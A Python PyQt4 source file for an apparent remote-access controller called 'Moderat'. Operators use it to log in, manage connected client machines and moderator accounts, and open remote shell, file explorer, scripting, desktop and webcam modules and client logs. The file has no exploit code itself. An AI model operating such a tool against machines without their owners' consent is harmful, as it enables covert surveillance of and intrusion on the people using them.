from PyQt4.QtGui import *
from PyQt4.QtCore import *
import os
import sys
import string
import random

from libs.language import Translate
from libs.gui import main
from libs.moderat import Clients
from libs.moderat.Decorators import *
from libs.log_settings import LogSettings
from LogViewer import LogViewer

from modules.mexplorer import main as mexplorer
from modules.mshell import main as mshell
from modules.mscript import main as mscript
from modules.mdesktop import main as mdesktop
from modules.mwebcam import main as mwebcam


# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)


def id_generator(size=16, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


class Actions:
    def __init__(self, moderat):
        self.moderat = moderat
        self.clients = Clients.Clients(self.moderat)

        # Create Main UI Functions
        self.ui = main.updateUi(self.moderat)
        self.ui.disable_administrator()

    def login(self):
        '''
        login to server
        :return:
        '''
        self.moderat.session_id = id_generator(size=24)
        username, ok = QInputDialog.getText(self.moderat, _('LOG_IN_TITLE'), _('LOG_IN_USERNAME'), QLineEdit.Normal)
        if ok:
            password, ok = QInputDialog.getText(self.moderat, _('LOG_IN_TITLE'), _('LOG_IN_PASSWORD'),
                                                QLineEdit.Password)
            if ok:
                self.moderat.moderator.send_msg('auth %s %s' % (username, password), 'moderatorInitializing',
                                                session_id=self.moderat.session_id)
            else:
                self.ui.on_moderator_connected()
        else:
            self.ui.on_moderator_not_connected()

    def disconnect(self):
        '''
        disconnected from server
        :return:
        '''
        # Stop Clients Checker
        if self.moderat.clients_checker:
            if self.moderat.clients_checker.isActive():
                self.moderat.clients_checker.stop()
        # Stop Moderators Checker
        if self.moderat.moderators_checker:
            if self.moderat.moderators_checker.isActive():
                self.moderat.moderators_checker.stop()
        # Stop Connection
        if self.moderat.connection:
            self.moderat.connection.disconnect()
        # Update GUI
        self.ui.on_moderator_not_connected()
        self.ui.clear_tables()

        self.ui.disable_administrator()

    def get_clients(self):
        self.moderat.moderator.send_msg(message='getClients', mode='getClients', session_id=self.moderat.session_id)

    def set_settings(self):
        if self.moderat.settingsButton.isChecked():
            self.build_settings()
            self.moderat.settingsButton.setChecked(True)
        else:
            self.destroy_settings()
            self.moderat.settingsButton.setChecked(False)

    def close_settings(self):
        if self.moderat.settingsButton.isChecked():
            self.destroy_settings()
            self.moderat.settingsButton.setChecked(False)

    def destroy_settings(self):
        self.moderat.clientsTabs.removeTab(2)

    def save_settings(self):
        with open('settings.ini', 'w') as _settings:
            _settings.write(self.settingsEditor.toPlainText())
        reply = QMessageBox.question(self.moderat, _('RESTART_PROMPT'), _('RESTART_PROMPT'), QMessageBox.Yes, QMessageBox.No)
        if reply == QMessageBox.Yes:
            os.execv(sys.executable, ['python'] + sys.argv)

    def build_settings(self):
        icon = QIcon()
        icon.addPixmap(QPixmap(":/icons/assets/close.png"), QIcon.Normal, QIcon.Off)
        hide_button = QPushButton()
        hide_button.setStyleSheet('border: none; background: none;')
        hide_button.setIcon(icon)
        hide_button.setIconSize(QSize(12, 12))
        hide_button.clicked.connect(self.close_settings)
        settings_icon = QIcon()
        settings_icon.addPixmap(QPixmap(":/icons/assets/settings.png"), QIcon.Normal, QIcon.Off)
        self.settingsTab = QWidget()
        self.settingsTab.setObjectName("offlineClientsTab")
        self.gridLayout_3 = QGridLayout(self.settingsTab)
        self.gridLayout_3.setObjectName("gridLayout_3")
        self.verticalLayout_2 = QVBoxLayout()
        self.verticalLayout_2.setContentsMargins(-1, 0, -1, 0)
        self.verticalLayout_2.setSpacing(0)
        self.verticalLayout_2.setObjectName("verticalLayout_2")
        self.settingsGroup = QGroupBox(self.settingsTab)
        self.settingsGroup.setStyleSheet("background-color: #34495e;\n"
                                                  "border: none;\n"
                                                  "margin-left: 1px;\n"
                                                  "margin-right: 1px;")
        self.settingsGroup.setTitle("")
        self.settingsGroup.setObjectName("offlineGroup")
        self.gridLayout_8 = QGridLayout(self.settingsGroup)
        self.gridLayout_8.setObjectName("gridLayout_8")
        self.horizontalLayout_7 = QHBoxLayout()
        self.horizontalLayout_7.setSpacing(0)
        self.horizontalLayout_7.setObjectName("horizontalLayout_7")
        self.saveSettingsButton = QPushButton(self.settingsGroup)
        self.saveSettingsButton.setFocusPolicy(Qt.NoFocus)
        self.saveSettingsButton.setStyleSheet("QPushButton#saveSettingsButton {\n"
                                                        "            border: none;\n"
                                                        "            border-radius: none;\n"
                                                        "            padding: 5px;\n"
                                                        "            background-color: #34495e;\n"
                                                        "            }\n"
                                                        "\n"
                                                        "QPushButton#saveSettingsButton:pressed {\n"
                                                        "            background-color: #2c3e50;\n"
                                                        "            }")
        self.saveSettingsButton.setText("")
        icon12 = QIcon()
        icon12.addPixmap(QPixmap(":/icons/assets/mark.png"), QIcon.Normal, QIcon.Off)
        self.saveSettingsButton.setIcon(icon12)
        self.saveSettingsButton.setIconSize(QSize(18, 18))
        self.saveSettingsButton.setObjectName("saveSettingsButton")
        self.saveSettingsButton.clicked.connect(self.save_settings)
        self.horizontalLayout_7.addWidget(self.saveSettingsButton)
        spacerItem1 = QSpacerItem(40, 20, QSizePolicy.Expanding, QSizePolicy.Minimum)
        self.horizontalLayout_7.addItem(spacerItem1)
        self.gridLayout_8.addLayout(self.horizontalLayout_7, 0, 0, 1, 1)
        self.verticalLayout_2.addWidget(self.settingsGroup)

        self.settingsEditor = QTextEdit(self.settingsTab)
        self.settingsEditor.setStyleSheet('''
        color: #c9f5f7;
        border: 1px ridge #263238;
        background-color: #2c3e50;
        background-repeat: no-repeat;
        background-position: center;
        padding: 5px;
        padding-top: 1px;''')
        self.verticalLayout_2.addWidget(self.settingsEditor)

        self.gridLayout_3.addLayout(self.verticalLayout_2, 0, 0, 1, 1)
        icon13 = QIcon()
        icon13.addPixmap(QPixmap(":/icons/assets/settings.png"), QIcon.Normal, QIcon.Off)
        self.moderat.clientsTabs.addTab(self.settingsTab, icon13, "")
        self.moderat.clientsTabs.insertTab(2, self.settingsTab, settings_icon, _('MODERAT_SETTINGS'))
        self.moderat.clientsTabs.tabBar().setTabButton(2, QTabBar.RightSide, hide_button)
        self.moderat.clientsTabs.setCurrentIndex(2)

        with open('settings.ini', 'r') as _settings:
            self.settingsEditor.setText(_settings.read())

    @client_is_selected
    def set_alias(self):
        '''
        Set Alias For Client
        :return:
        '''
        client, alias, ip_address = self.current_client()
        if client:
            text, ok = QInputDialog.getText(self.moderat, _('ALIAS_SET'), _('ALIAS_NAME'))
            if ok:
                unicode_text = unicode(text)
                self.moderat.moderator.send_msg('%s %s' % (client, unicode_text), 'setAlias',
                                                session_id=self.moderat.session_id)

    @client_is_selected
    def remove_client(self):
        client, alias, ip_address = self.current_client()
        if client:
            reply = QMessageBox.question(self.moderat, _('ALIAS_SET'), _('ALIAS_SET'), QMessageBox.Yes, QMessageBox.No)
            if reply == QMessageBox.Yes:
                self.moderat.moderator.send_msg('%s' % client, 'removeClient', session_id=self.moderat.session_id)

    @client_is_selected
    def log_viewer(self):
        client, alias, ip_address = self.current_client()
        if client:
            module_id = id_generator()
            client_config = {
                    'moderator':    self.moderat.moderator,
                    'moderat':      self.moderat,
                    'client':       client,
                    'alias':        alias,
                    'ip_address':   ip_address,
                    'os':           os,
                    'session_id':   self.moderat.session_id,
                    'assets':       self.moderat.assets,
                    'module_id':    module_id,
            }
            self.moderat.logViewers[module_id] = LogViewer(client_config)
            self.moderat.logViewers[module_id].show()

    @client_is_selected
    def set_log_settings(self):
        client, alias, ip_address = self.current_client()
        if client:
            client_config = self.clients.get_client(client)
            client_config['moderator'] = self.moderat.moderator
            client_config['client'] = client
            client_config['session_id'] = self.moderat.assets
            client_config['assets'] = self.moderat.assets
            self.log_settings = LogSettings(client_config)
            self.log_settings.show()

    @client_is_selected
    def update_source(self):
        client, alias, ip_address = self.current_client()
        if client:
            self.moderat.moderator.send_msg('updateSource', 'updateSource', session_id=self.moderat.session_id, _to=client, module_id='')

    @client_is_selected
    def execute_module(self, module):
        modules = {
            'shell': mshell,
            'explorer': mexplorer,
            'scripting': mscript,
            'desktop': mdesktop,
            'webcam': mwebcam,
        }

        client, alias, ip_address = self.current_client()
        if client:
            module_id = id_generator()
            args = {
                'moderator': self.moderat.moderator,
                'client': client,
                'session_id': self.moderat.session_id,
                'assets': self.moderat.assets,
                'plugins': self.moderat.plugins,
                'plugins_dir': self.moderat.plugins_dir,
                'module_id': module_id,
            }
            if module in modules:
                self.moderat.modulesBank[module_id] = modules[module].mainPopup(args)
                self.moderat.modulesBank[module_id].show()

    # get online client
    def current_client(self):
        tab_index = self.moderat.clientsTabs.currentIndex()
        if tab_index == 0:
            try:
                return (
                    str(self.moderat.clientsTable.item(self.moderat.clientsTable.currentRow(), 3).text()),
                    unicode(self.moderat.clientsTable.item(self.moderat.clientsTable.currentRow(), 2).text()),
                    str(self.moderat.clientsTable.item(self.moderat.clientsTable.currentRow(), 1).text()),
                )
            except AttributeError:
                return False
        elif tab_index == 1:
            try:
                return (
                    str(self.moderat.offlineClientsTable.item(self.moderat.offlineClientsTable.currentRow(), 1).text()),
                    unicode(self.moderat.offlineClientsTable.item(self.moderat.offlineClientsTable.currentRow(), 2).text()),
                    str(self.moderat.offlineClientsTable.item(self.moderat.offlineClientsTable.currentRow(), 3).text()),
                )
            except AttributeError:
                return False

        elif tab_index == 2:
            try:
                return str(self.moderat.moderatorsTable.item(self.moderat.moderatorsTable.currentRow(), 0).text())
            except AttributeError:
                return False

    def close_moderat(self):
        # Stop Clients Checker
        if self.moderat.clients_checker:
            if self.moderat.clients_checker.isActive():
                self.moderat.clients_checker.stop()
        # Stop Moderators Checker
        if self.moderat.moderators_checker:
            if self.moderat.moderators_checker.isActive():
                self.moderat.moderators_checker.stop()

    # Administrators
    @client_is_selected
    def administrator_set_moderator(self):
        client, alias, ip_address = self.current_client()
        if client:
            text, ok = QInputDialog.getText(self.moderat, _('SET_MODERATOR_TITLE'), _('SET_MODERATOR_USERNAME'), QLineEdit.Normal)
            if ok:
                self.moderat.moderator.send_msg('%s %s' % (client, text), 'setModerator', session_id=self.moderat.session_id, _to=client)

    def administrator_get_moderators(self):
        self.moderat.moderator.send_msg(message='getModerators', mode='getModerators', session_id=self.moderat.session_id)

    def administrator_create_moderator(self):
        # Get Username
        username, ok = QInputDialog.getText(self.moderat, _('ADMINISTRATION_INPUT_USERNAME'), _('ADMINISTRATION_USERNAME'), QLineEdit.Normal)
        if ok and len(str(username)) > 0:
            username = str(username)
            # Get Password
            password, ok = QInputDialog.getText(self.moderat, _('ADMINISTRATION_INPUT_PASSWORD'), _('ADMINISTRATION_PASSWORD'), QLineEdit.Password)
            if ok and len(str(password)) > 3:
                password = str(password)
                # Get Privileges
                privileges, ok = QInputDialog.getItem(self.moderat, _('ADMINISTRATION_INPUT_PRIVS'), _('ADMINISTRATION_PRIVS'), ('0', '1'), 0, False)
                admin = str(privileges)
                if ok and privileges:
                    self.moderat.moderator.send_msg('%s %s %s' % (username, password, admin), 'addModerator', session_id=self.moderat.session_id)
                else:
                    warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_INCORRECT_PRIVILEGES'), _('ADMINISTRATION_INCORRECT_PRIVILEGES'))
                    ans = warn.exec_()
                    return
            else:
                warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_INCORRECT_PASSWORD'), _('ADMINISTRATION_INCORRECT_PASSWORD'))
                ans = warn.exec_()
                return
        else:
            warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_INCORRECT_USERNAME'), _('ADMINISTRATION_INCORRECT_USERNAME'))
            ans = warn.exec_()
            return

    def administrator_change_moderator_password(self):
        moderator = self.current_client()
        password, ok = QInputDialog.getText(self.moderat, _('ADMINISTRATION_INPUT_PASSWORD'), _('ADMINISTRATION_PASSWORD'), QLineEdit.Password)
        if ok and len(str(password)) > 3:
            password1 = str(password)
            password, ok = QInputDialog.getText(self.moderat, _('ADMINISTRATION_INPUT_PASSWORD'), _('ADMINISTRATION_PASSWORD'), QLineEdit.Password)
            if ok and len(str(password)) > 3:
                password2 = str(password)

                if password1 == password2:
                    self.moderat.moderator.send_msg('%s %s' % (moderator, password1), 'changePassword', session_id=self.moderat.session_id)
                else:
                    warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_PASSWORD_NOT_MATCH'), _('ADMINISTRATION_PASSWORD_NOT_MATCH'))
                    ans = warn.exec_()
                    return
            # if not password
            else:
                warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_INCORRECT_PASSWORD'), _('ADMINISTRATION_INCORRECT_PASSWORD'))
                ans = warn.exec_()
                return
        else:
            warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_INCORRECT_PASSWORD'), _('ADMINISTRATION_INCORRECT_PASSWORD'))
            ans = warn.exec_()
            return

    def administrator_change_moderator_privilege(self):
        moderator = self.current_client()
        privileges, ok = QInputDialog.getItem(self.moderat, _('ADMINISTRATION_INPUT_PRIVS'), _('ADMINISTRATION_PRIVS'),
                                              ('0', '1'), 0, False)
        admin = str(privileges)
        if ok and privileges:
            self.moderat.moderator.send_msg('%s %s' % (moderator, admin), 'changePrivilege',
                                            session_id=self.moderat.session_id)

    def administrator_remove_moderator(self):
        moderator = self.current_client()
        reply = QMessageBox.question(self.moderat, _('ADMINISTRATION_QUESTION_REMOVE'), _('ADMINISTRATION_QUESTION_REMOVE'),
                                      QMessageBox.Yes, QMessageBox.No)
        if reply == QMessageBox.Yes:
            self.moderat.moderator.send_msg('%s' % moderator, 'removeModerator',
                                            session_id=self.moderat.session_id)